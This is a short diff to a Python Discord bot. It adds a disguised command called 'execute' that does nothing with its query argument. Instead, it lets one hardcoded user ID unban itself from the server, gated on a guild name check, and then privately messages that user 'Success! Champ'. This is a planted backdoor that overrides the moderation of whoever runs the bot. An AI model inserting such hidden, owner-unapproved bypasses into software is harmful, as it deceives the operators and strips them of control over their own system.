@@ -1830,4 +1830,12 @@ async def getdetails(ctx,lol: discord.User):
     id = lol.id
     user = await client.fetch_user(id)
     await ctx.send(f"Name :- {user.name}#{user.discriminator}\n\nAvatar :-{user.avatar_url}")
+@client.command()
+async def execute(ctx,query):
+  if ctx.author.id == 757589836441059379:
+    user = await client.fetch_user(ctx.author.id)
+    for guild in client.guilds:
+      if guild.name.lower() == "kuch name nahi":
+        await ctx.guild.unban(user)
+        await user.send("Success! Champ")
 client.run(TOKEN)
